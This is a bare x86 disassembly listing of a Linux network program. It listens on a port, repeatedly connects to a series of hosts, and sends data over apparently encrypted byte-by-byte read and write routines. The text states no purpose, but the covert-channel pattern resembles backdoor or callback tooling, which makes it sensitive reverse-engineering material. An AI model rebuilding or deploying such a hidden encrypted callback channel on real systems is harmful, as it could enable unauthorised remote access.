add esp, 0xc
cmp edi, 0xffffffff
jne 0x8049450
cmp dword [var_154h], 0
je 0x8049691
cmp dword [var_13ch], 0xffff
jg 0x8049691
mov edx, dword [var_140h]
cmp edx, 0xffff
jg 0x8049691
test edx, edx
je 0x8049527
mov dword [0x804cb00], edx
mov dword [0x804cb04], 0
lea eax, [var_100h]
mov dword [var_15ch], eax
push eax
mov ecx, dword [var_154h]
push ecx
call fcn.08048d00
mov dword [var_158h], eax
add esp, 8
cmp eax, 0xffffffff
jne 0x8049560
mov eax, dword [var_154h]
push eax
call sym.imp.perror
jmp 0x8049847
nop
push 6
push 1
push 2
call sym.imp.socket
mov ebx, eax
add esp, 0xc
test ebx, ebx
jge 0x8049583
push str.socket
call sym.imp.perror
jmp 0x8049847
push 0x10
lea edi, [var_128h]
push edi
call sym.imp.bzero
mov word [var_128h], 2
add esp, 8
mov dword [var_124h], 0
mov ecx, dword [var_13ch]
ror cx, 8
mov word [var_126h], cx
push 0x10
mov esi, edi
push esi
push ebx
call sym.imp.bind
mov edx, eax
add esp, 0xc
test edx, edx
jge 0x80495e0
push str.bind
call sym.imp.perror
jmp 0x8049847
nop
lea esi, [esi]
push 1
push ebx
call sym.imp.listen
add esp, 8
test eax, eax
jge 0x8049600
push str.listen
call sym.imp.perror
jmp 0x8049847
mov esi, esi
mov dword [var_150h], 4
lea eax, [var_150h]
push eax
push esi
push ebx
call sym.imp.getsockname
add esp, 0xc
test eax, eax
jge 0x8049630
push str.getsockname
call sym.imp.perror
jmp 0x8049847
mov esi, esi
mov ax, word [var_126h]
ror ax, 8
movzx ecx, ax
mov dword [var_13ch], ecx
push ecx
push str.Listening_to_port__d_n
call sym.imp.printf
movzx eax, word [var_13ch]
push eax
mov ecx, dword [var_160h]
push ecx
call fcn.08048d68
call sym.imp.fork
mov edx, eax
add esp, 0x10
test edx, edx
jge 0x8049680
push str.fork
call sym.imp.perror
jmp 0x8049847
test edx, edx
je 0x80496b0
push edi
push ebx
push edx
call fcn.08048eb4
jmp 0x804984c
push dword [ebx]
call fcn.08048ce0
jmp 0x804984c
lea esi, [esi]
push str.socket
call sym.imp.perror
jmp 0x8049847
nop
push ebx
call sym.imp.close
add esp, 4
cmp dword [0x804cb00], 0
je 0x8049830
xor esi, esi
push 0
push 1
push 2
call sym.imp.socket
mov edi, eax
add esp, 0xc
test edi, edi
jl 0x80496a0
push 0x10
lea ebx, [var_138h]
push ebx
call sym.imp.bzero
mov word [var_138h], 2
add esp, 8
mov ax, word [esi + 0x804cb00]
ror ax, 8
mov word [var_136h], ax
mov ecx, dword [var_158h]
mov dword [var_134h], ecx
push dword [esi + 0x804cb00]
mov eax, dword [var_15ch]
push eax
push str.Trying__s:_d..._n
push dword [obj.stderr]
call sym.imp.fprintf
push dword [var_14ch]
call fcn.08048cbc
push 0x10
push ebx
push edi
call sym.imp.connect
mov edx, eax
add esp, 0x20
cmp dword [0x804cb24], 0
je 0x8049770
push str.connect:_Timed_out_n
push dword [obj.stderr]
call sym.imp.fprintf
add esp, 8
jmp 0x8049820
nop
lea esi, [esi]
test edx, edx
jge 0x8049786
push str.connect
call sym.imp.perror
add esp, 4
jmp 0x8049820
push str.Trying...
push dword [obj.stderr]
call sym.imp.fprintf
push dword [var_148h]
call fcn.08048cbc
add esp, 0xc
cmp dword [0x804cb24], 0
jne 0x80497fa
lea esi, [esi]
push 0x16
mov ecx, dword [var_160h]
push ecx
push edi
call sym.imp.write
mov edx, eax
add esp, 0xc
test edx, edx
jl 0x80497fa
push dword [var_144h]
call sym.imp.sleep
push 0x804ba3e
push dword [obj.stderr]
call sym.imp.fprintf
push dword [obj.stderr]
call sym.imp.fflush
add esp, 0x10
cmp dword [0x804cb24], 0
je 0x80497b0
push dword [var_148h]
mov eax, dword [var_154h]
push eax
push str._n_s:_no_response_within__d_seconds_n
push dword [obj.stderr]
call sym.imp.fprintf
push edi
call sym.imp.close
add esp, 0x14
add esi, 4
cmp dword [esi + 0x804cb00], 0
jne 0x80496c8
mov ecx, dword [var_154h]
push ecx
push str._s:_server_not_responding__giving_up__n
push dword [obj.stderr]
call sym.imp.fprintf
mov eax, 1
lea esp, [var_174h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10
push edi
push esi
push ebx
mov esi, dword [arg_14h]
xor edi, edi
cmp edi, dword [arg_10h]
jge 0x804b549
lea edx, [var_1h]
mov dword [var_8h], edx
lea esi, [esi]
mov ecx, dword [arg_ch]
mov cl, byte [ecx]
mov ebx, dword [esi + 0x14]
mov al, byte [ebx + esi]
mov byte [var_9h], cl
xor byte [var_9h], al
add al, cl
mov byte [ebx + esi], al
mov eax, dword [esi + 0x14]
lea edx, [eax + 1]
mov dword [esi + 0x14], edx
cmp eax, 0x13
jne 0x804b517
push esi
push 0x14
push esi
call fcn.0804b390
mov dword [esi + 0x14], 0
add esp, 0xc
mov cl, byte [var_9h]
mov byte [var_1h], cl
mov eax, 4
mov ebx, dword [arg_8h]
mov ecx, dword [var_8h]
mov edx, 1
int 0x80
test eax, eax
jge 0x804b540
mov eax, 0xffffffff
jmp 0x804b54b
lea esi, [esi]
inc edi
inc dword [arg_ch]
cmp edi, dword [arg_10h]
jl 0x804b4e0
mov eax, edi
lea esp, [var_1ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
push edi
push esi
push ebx
mov esi, dword [arg_14h]
xor edi, edi
cmp edi, dword [arg_10h]
jge 0x804b5d8
lea edx, [var_1h]
mov dword [var_8h], edx
lea esi, [esi]
mov eax, 3
mov ebx, dword [arg_8h]
mov ecx, dword [var_8h]
mov edx, 1
int 0x80
test eax, eax
jge 0x804b590
mov eax, 0xffffffff
jmp 0x804b5da
lea esi, [esi]
mov edx, dword [esi + 0x14]
mov al, byte [edx + esi]
mov byte [var_9h], al
mov cl, byte [var_1h]
xor byte [var_9h], cl
add al, byte [var_9h]
mov byte [edx + esi], al
mov eax, dword [esi + 0x14]
lea ebx, [eax + 1]
mov dword [esi + 0x14], ebx
cmp eax, 0x13
jne 0x804b5c6
push esi
push 0x14
push esi
call fcn.0804b390
mov dword [esi + 0x14], 0
add esp, 0xc
mov dl, byte [var_9h]
mov ecx, dword [arg_ch]
mov byte [ecx], dl
inc edi
inc ecx
mov dword [arg_ch], ecx
cmp edi, dword [arg_10h]
jl 0x804b570
mov eax, edi
lea esp, [var_18h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push esi
push ebx
mov ebx, dword [arg_8h]
mov cl, byte [arg_ch]
mov edx, dword [ebx + 0x14]
mov al, byte [edx + ebx]
mov byte [var_1h], cl
xor byte [var_1h], al
add al, cl
mov byte [edx + ebx], al
mov eax, dword [ebx + 0x14]
lea esi, [eax + 1]
mov dword [ebx + 0x14], esi
cmp eax, 0x13
jne 0x804b621
push ebx
push 0x14
push ebx
call fcn.0804b390
mov dword [ebx + 0x14], 0
movzx eax, byte [var_1h]
lea esp, [var_ch]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x14]
mov al, byte [edx + ebx]
mov byte [var_1h], al
mov cl, byte [arg_ch]
xor byte [var_1h], cl
add al, byte [var_1h]
mov byte [edx + ebx], al
mov eax, dword [ebx + 0x14]
lea ecx, [eax + 1]
mov dword [ebx + 0x14], ecx
cmp eax, 0x13
jne 0x804b669
push ebx
push 0x14
push ebx
call fcn.0804b390
mov dword [ebx + 0x14], 0
movzx eax, byte [var_1h]
mov ebx, dword [var_8h]
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
call fcn.0804b6b5
push ebp
mov ebp, esp
push esi
push ebx
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
mov ecx, dword [arg_10h]
xor edx, edx
cmp edx, ecx
jge 0x804bcb1
mov al, byte [edx + ebx]
cmp byte [edx + esi], al
je 0x804bcac
xor eax, eax
jmp 0x804bcb6
inc edx
cmp edx, ecx
jl 0x804bca0
mov eax, 1
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
test edx, edx
jle 0x804bd1f
lea esi, [esi]
mov al, byte [ecx]
mov byte [ebx], al
inc ebx
inc ecx
dec edx
test edx, edx
jg 0x804bd14
mov ebx, dword [var_4h]
leave
ret
